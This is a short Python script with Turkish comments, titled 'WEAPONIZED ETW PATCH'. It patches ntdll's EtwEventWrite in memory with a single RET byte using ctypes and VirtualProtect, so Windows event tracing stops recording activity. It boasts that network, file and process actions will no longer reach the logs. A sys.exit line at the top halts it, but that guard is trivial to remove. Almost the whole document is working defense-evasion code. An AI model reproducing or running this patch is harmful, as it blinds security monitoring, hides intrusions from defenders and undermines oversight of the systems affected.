import ctypes
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Windows Loglama (ETW) sistemini kör eder.")

print("--- WEAPONIZED ETW PATCH ---")

def blind_etw():
    # 1. HEDEF ADRES (Weaponized Part)
    # ntdll.dll içindeki EtwEventWrite fonksiyonu
    
    dll = ctypes.windll.kernel32.LoadLibraryA(b"ntdll.dll")
    addr = ctypes.windll.kernel32.GetProcAddress(dll, b"EtwEventWrite")
    
    print(f"[*] EtwEventWrite Adresi: {hex(addr)}")
    
    # 2. MEMORY PATCH
    # x64 Assembly: RET (c3)
    # Fonksiyon çağrıldığı an hiçbir şey yapmadan geri dönecek.
    
    patch = b"\xc3" 
    
    # Belleği yazılabilir yap
    old_protect = ctypes.c_ulong()
    ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old_protect))
    
    # Yamayı yapıştır
    ctypes.memmove(addr, patch, 1)
    
    # Belleği eski haline getir
    ctypes.windll.kernel32.VirtualProtect(addr, 1, old_protect, ctypes.byref(old_protect))
    
    print("💀 ETW DEVRE DIŞI.")
    print("Artık yaptığınız işlemler (Ağ, Dosya, Process) loglara düşmeyecek.")

if __name__ == "__main__":
    blind_etw()